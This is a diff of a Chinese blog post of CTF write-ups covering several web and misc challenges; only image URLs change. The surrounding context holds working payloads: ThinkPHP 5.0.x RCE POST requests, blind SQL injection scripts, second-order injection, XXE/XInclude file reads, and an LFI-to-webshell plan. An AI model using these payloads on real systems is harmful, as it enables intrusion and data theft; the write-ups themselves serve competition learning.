 <p> <a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg</a></p>
@@ -857,9 +854,9 @@ preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])
 </code></pre>
 <p>绕过<code>filter_var()</code>和<code>preg_match()</code>函数的文章看这篇： <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
 <p>filter_var()</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-1.png" alt="4-1"></p>
 <p>parse_url</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-2.png" alt="4-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-2.png" alt="4-2"></p>
 <p>本题正确方法如下：</p>
 <blockquote>
 <p>① 氪金，购买一个含有 baidu.com 的域名</p>
@@ -1088,7 +1085,7 @@ while 1:
         break
 
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-3.png" alt="4-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-3.png" alt="4-3"></p>
 <p>完整题目的 EXP 如下：</p>
 <pre><code class="python">import requests
 
@@ -1110,7 +1107,7 @@ while 1:
 <p>\&lt;!–src in /code and flag is in this page–></p>
 </blockquote>
 <p>按照提示，在 URL 后面添加<code>/code</code>得到源码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/1-1.png" alt="1-1"></p>
 <p>内容如下</p>
 <pre><code class="php">&lt;?php
 highlight_file(__FILE__);
@@ -1167,21 +1164,21 @@ echo $result;
 
 </code></pre>
 <p>dirsearch 扫到<code>flag.php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-2.png" alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-2.png" alt="2-2"></p>
 <p>源代码中看到提示</p>
 <blockquote>
 <p> there is no flag /etc/hosts</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-3.png" alt="2-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-3.png" alt="2-3"></p>
 <p>查看<code>/etc/hosts</code>原代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-4.png" alt="2-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-4.png" alt="2-4"></p>
 <p>发现这个<code>172.18.0.2</code>，用<code>http</code>协议</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-5.png" alt="2-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-5.png" alt="2-5"></p>
 <p>尝试<code>172.18.0.2</code>，拿到提示</p>
 <blockquote>
 <p>\&lt;!– include $_GET[a]; –> </p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-6.png" alt="2-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-6.png" alt="2-6"></p>
 <p>存在<code>LFI</code>，并且扫描端口的结果中发现 25 号端口开放 <code>smtp</code> 服务。 于是可以联想到利用<code>gopher</code>协议打 smtp，然后再结合发现的 LFI 漏洞，得出这样的思路</p>
 <blockquote>
 <p>利用gopher打smtp，在日志文件中留下一句话木马，然后用 LFI 包含日志文件获取 webshell</p>
@@ -1189,18 +1186,18 @@ echo $result;
 <p>以上思路在本次比赛中没有复现成功，具体思路看<a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">原题 Write Up</a></p>
 <p>① 如果成功将一句话写入日志，菜刀连接后拿 flag</p>
 <p>② 也可以继续用 LFI 然后伪协议读取 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-7.png" alt="2-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-7.png" alt="2-7"></p>
 <h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>点击<code>about</code>发现提交了<code>id</code>参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-1.png" alt="3-1"></p>
 <p>添加单引号报错，但是只是提示<code>404</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-2.png" alt="3-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-2.png" alt="3-2"></p>
 <p>后面的尝试发现了黑名单，先列出来</p>
 <pre><code>?id=-1
 or
 and
 union select
 ,
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-4.png" alt="3-4"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-4.png" alt="3-4"></p>
 <p><strong>Bypass</strong></p>
 <blockquote>
 <p>① || 代替 or</p>
@@ -1211,7 +1208,7 @@ union select
 </blockquote>
 <p>尝试，发现单引号包裹</p>
 <pre><code>?id=2&#39; || &#39;1
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-3.png" alt="3-3"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-3.png" alt="3-3"></p>
 <p>做题前先将几个知识点：① 无列名注入；② join 代替逗号</p>
 <p>最后 EXP</p>
 <pre><code class="python">import requests
@@ -1415,36 +1412,36 @@ Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监�
 </code></pre><p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<code>listen://listen.xyz</code>，但是 listen 是未定义的模块，所以会自动搜索并加载<code>URI/listen.pm</code>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
 <p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
 <p>然后执行根目录下的<code>readflag</code>就能拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/4-1.png" alt="4-1"></p>
 <h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<code>thinkphp</code>的洞。进来后要登录，先注册一个普通用户登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-1.png" alt="1-1"></p>
 <p>然后用这个普通用户登陆进去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-2.png" alt="1-2"></p>
 <p>打算直接用一下之前刚碰到的<code>thinkphp 5.0.23</code>的<code>RCE</code>，看一下漏洞是否存在，结果直接看到版本号</p>
 <pre><code>http://183.129.189.62:19403/?s=captcha
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-3.png" alt="1-3"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-3.png" alt="1-3"></p>
 <p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
 <p>试一下<code>scandir()</code>和<code>var_dump()</code>，扫描当前目录，直接出结果</p>
 <pre><code>URL：http://183.129.189.62:19403/index.php?s=captcha
 
 POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-4.png" alt="1-4"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-4.png" alt="1-4"></p>
 <p>然后在<code>根目录</code>下找到<code>flag</code>字样</p>
 <pre><code>URL：http://183.129.189.62:19403/index.php?s=captcha
 
 POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-5.png" alt="1-5"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-5.png" alt="1-5"></p>
 <p>直接读取内容，拿下 flag</p>
 <pre><code>URL：http://183.129.189.62:19403/index.php?s=captcha
 
 POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-6.png" alt="1-6"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-6.png" alt="1-6"></p>
 <h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<code>badimages</code>的文件，直接拿到 fl</p>
 <pre><code>strings badimages | grep -i flag
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/2-1.png" alt="2-1"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/2-1.png" alt="2-1"></p>
 <h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
 <pre><code>strings mem.raw | grep -i flag{
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/3-1.png" alt="3-1"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/3-1.png" alt="3-1"></p>
 <h1 id="百越杯"><a href="#百越杯" class="headerlink" title="百越杯"></a>百越杯</h1><p>记录 2 道 web 题，2 道 Misc 题</p>
 <h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>题目源码</p>
 <pre><code class="php">&lt;?php 
@@ -1540,7 +1537,7 @@ $a-&gt;source = new Show();
 echo urlencode(serialize($a)).&quot;\n&quot;;
 ?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/1-1.png" alt="1-1"></p>
 <p>序列化字符串</p>
 <pre><code class="php">O:4:&quot;Show&quot;:2:{
     s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{
@@ -1563,29 +1560,29 @@ echo urlencode(serialize($a)).&quot;\n&quot;;
 }
 </code></pre>
 <p>拿下 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/1-2.png" alt="1-2"></p>
 <h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>打开靶机，有一个登录和注册功能，源代码中有提示：</p>
 <blockquote>
 <p>\<!-- if you need hash tools, location: tools.php --> </p>
 </blockquote>
 <p>访问tools.php，页面要求提交一个md5值： </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-1.png" alt="2-1"></p>
 <p>但是提交一个1的md5值，返回无结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-2.png" alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-2.png" alt="2-2"></p>
 <p>暂时不知道怎么利用，只能去看看登录注册功能 </p>
 <p>注册发现<strong>admin</strong>用户存在，注册其他用户登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-3.png" alt="2-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-3.png" alt="2-3"></p>
 <p>发现跳转到了<strong>manage.php</strong>，<strong>action</strong>参数测试发现无文件包含点，点进去<strong>here is your flag</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-4.png" alt="2-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-4.png" alt="2-4"></p>
 <p>给了一个假flag，又看起来像是md5值，拿进去tools.php里面查询也没有返回结果 </p>
 <p>然后就是<strong>msgid</strong>疑似注入点，但是除了1以外其他都没有返回结果 </p>
 <p>目光回到注册登录功能上，先尝试了一下<strong>约束攻击</strong>，发现注册 admin 1 ，在登陆以后，成功登录admin</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-5.png" alt="2-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-5.png" alt="2-5"></p>
 <p>但是，点进here is your flag里面还是没有flflag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-6.png" alt="2-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-6.png" alt="2-6"></p>
 <p>这里有两个here is your flag，估计是因为除了我们注册的admin(空格)外，另外还有一个原本admin的 </p>
 <p>并且发现，当注册一个带有单引号的 admin’ ，会被转义，并且没有显示出<strong>here is your flag</strong>的链接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-7.png" alt="2-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-7.png" alt="2-7"></p>
 <p>所以，猜测这里存在<strong>二次注入</strong>点，但是一直没试成功，直到放出了提示：<strong>二次注入测试引号逃逸</strong> </p>
 <p>看到了<strong>引号逃逸</strong>，就直接想到了之前约束攻击，其实不是约束攻击，而是后台用了<strong>字符串截取</strong>，测试发现，最大长 </p>
 <p>度为：<strong>30</strong> </p>
@@ -1594,18 +1591,18 @@ echo urlencode(serialize($a)).&quot;\n&quot;;
 <pre><code>注册：admin                        &#39; =&gt; 长度30
 经过转义处理：admin                        \&#39; =&gt; 长度31
 经过substr截取前30个字符：admin                        \ =&gt;长度30 =&gt;单引号逃逸
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-8.png" alt="2-8"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-8.png" alt="2-8"></p>
 <p>结合之前的<strong>here is your flag</strong>链接中的参数<strong>msgid</strong>，就猜测，注册后执行的查询语句： </p>
 <pre><code>select * from users where username=&#39;&#39; and msgid=&#39;1&#39;;
 </code></pre><p>那么既然逃逸了username后面的单引号，就只能在<strong>msgid</strong>中执行注入，payload：</p>
 <pre><code>?msgid= or 1#
 ?msgid = or 0#
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-9.png" alt="2-9"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-9.png" alt="2-9"></p>
 <p>拼接后为</p>
 <pre><code>select * from users where username=&#39;admin...\&#39; and msgid=&#39; or 0 #&#39;;
 </code></pre><p>因为前面传递了<code>反斜杠</code>，将原本的<code>单引号</code>注释掉，与后面的 msgid 的单引号闭合，才能用 or 进行盲注。这里如果多传入一个单引号也不行，因为会造成闭合，并且无法注释掉原本语句内的单引号</p>
 <p>条件为真时有返回结果，为假时无返回</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-10.png" alt="2-10"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-10.png" alt="2-10"></p>
 <p>根据这个逻辑进行盲注，exp如下：</p>
 <pre><code class="python">import requests
 s = requests.Session()
@@ -1632,13 +1629,13 @@ for i in range(1, 50):
             database = database + chr(j)
             print database
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-11.png" alt="2-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-11.png" alt="2-11"></p>
 <p>注出admin的密码：<strong>251471f34244cb6cd61f6b64c63f7b1a</strong> </p>
 <p>是md5，直接解密不了，这时候就想到了之前的<strong>tools.php</strong>，查询得到明文：<strong>ChunQiuGame</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-12.png" alt="2-12"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-12.png" alt="2-12"></p>
 <p>登录admin后，跳转到 manage.php?action=admin ，提示我们POST content 参数进行xxe</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-13.png" alt="2-13"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-14.png" alt="2-14"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-13.png" alt="2-13"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-14.png" alt="2-14"></p>
 <p>尝试直接引入外部实体读取文件：</p>
 <pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE ANY [
@@ -1646,7 +1643,7 @@ for i in range(1, 50):
 ]&gt;
 &lt;abc&gt;&amp;test;&lt;/abc&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-15.png" alt="2-15"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-15.png" alt="2-15"></p>
 <p>但是没有返回结果，从相应来看，也没有过滤掉什么关键字 </p>
 <p>尝试无回显xxe，都失败了 </p>
 <p>赛后得到的提示是：<strong>xinclude</strong> </p>
@@ -1662,49 +1659,49 @@ $dom-&gt;loadXML($xml);
 echo $dom-&gt;saveXML();
 ?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-16.png" alt="2-16"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-16.png" alt="2-16"></p>
 <p>直接用传统引入外部实体的方法读取文件，是因为php的xml库的底层库是libxml2，而在2.6版本之后，改库已默 </p>
 <p>认禁用外部实体引用的解析 </p>
 <p>我们只有加入<strong>LIBXML_NOENT</strong> 选项，才能解析外部实体： </p>
 <pre><code>$dom-&gt;loadXML($xml,LIBXML_NOENT);
 </code></pre><p>而<strong>xinclude</strong>无需使用 LIBXML_NOENT 选项去开启默认关闭的外部实体引用 </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-17.png" alt="2-17"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-17.png" alt="2-17"></p>
 <p>最后传入payload：</p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
 &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
  &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;
 &lt;/root&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-18.png" alt="2-18"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-18.png" alt="2-18"></p>
 <h2 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h2><p>首先题目解压出来 2 个文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-1.png" alt="1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-1.png" alt="1"></p>
 <p><code>Winhex</code>打开这个<code>102%</code>发现文件头很熟悉</p>
 <pre><code>89 47 4E 50
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-2.png" alt="2"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-2.png" alt="2"></p>
 <p>就是<code>png图片文件头</code>的变形，将其修改回来。并且添加后缀就可以看到图片</p>
 <pre><code>89 50 4E 47
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-3.png" alt="3"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-3.png" alt="3"></p>
 <p>将<code>ori.jpg</code>做成灰度图（可以用在线网站： <a href="http://grayscale.imageonline.co/cn/" target="_blank" rel="noopener">http://grayscale.imageonline.co/cn/</a> ）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-4.png" alt="4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-4.png" alt="4"></p>
 <p>下载其<code>png</code>格式，这里命名为<code>ori_grey.png</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-5.png" alt="5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-5.png" alt="5"></p>
 <p>然后用<code>PS</code>打开<code>102%.png</code>和<code>ori_gray.png</code>，然后复制 ori_gray.png 的图层到 102%.png 上</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-6.png" alt="6"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-7.png" alt="7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-6.png" alt="6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-7.png" alt="7"></p>
 <p>然后来到 102%.png ，选择模式为<code>减去</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-8.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-8.png" alt></p>
 <p>然后选择<code>色阶</code>，调到<code>最左边</code>，就可以看见二维码了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-9.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-9.png" alt></p>
 <p>扫描二维码，得到一串字符串：<code>1tsEz_b14ndVV4t3rM4k</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-10.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-10.png" alt></p>
 <p>然后<code>binwalk</code>那张 102%.png 图片，发现有压缩包，但是没那么简单，因为这个图片文件里一共有2个zip文件头（50 4B 03 04），但是前面的 zip 文件头被改成了<code>4B 50 03 04</code>，所以<code>foremost</code>只识别到后面那个，提取出来的不完整。正确做法是搜索 png 图片结尾（49 45 4E 44 AE 42 60 82），然后就会发现被修改的 zip 文件头，修改它并从那里提取出来，才能完整</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-15.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-11.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-15.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-11.png" alt></p>
 <p>解压需要密码，就用刚才二维码扫出来的字符串解密，得到2张图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-12.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-12.png" alt></p>
 <p>然后用<code>Stegsolve</code>先打开其中一张图片，点击<code>Analyse -&gt; Image Combiner</code>选择第二张图片，就能看到 flag 的字样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-13.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-13.png" alt></p>
 <p>可以将模式调整为<code>SUB</code>，这样看的比较清晰一些（或者先保存下载，然后再次打开调整）</p>
